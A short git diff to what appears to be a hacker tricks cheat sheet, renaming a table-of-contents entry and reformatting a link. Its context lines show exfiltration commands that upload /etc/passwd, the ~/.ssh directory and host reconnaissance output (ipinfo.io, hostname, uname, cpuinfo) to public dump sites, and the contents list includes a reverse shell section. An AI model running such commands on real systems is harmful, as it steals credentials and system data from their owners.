@@ -41,7 +41,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
    1. [File transfer without curl](#burl)
-   1. [File transfer for transfer.sh](#trans) 
+   1. [File transfer to public dump sites](#trans) 
    1. [File transfer using WebDAV](#webdav)
    1. [File transfer to Telegram](#tg) 
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
@@ -918,7 +918,7 @@ transfer /etc/passwd  # A single file
 transfer ~/.ssh       # An entire directory
 (curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
 ```
-A list of our <A href="?cloudexfil">favorite public upload sites</A>.
+A list of our [favorite public upload sites](#cloudexfil).
 
 <a id="webdav"></a>
 ### 4.viii. File transfer - using WebDAV
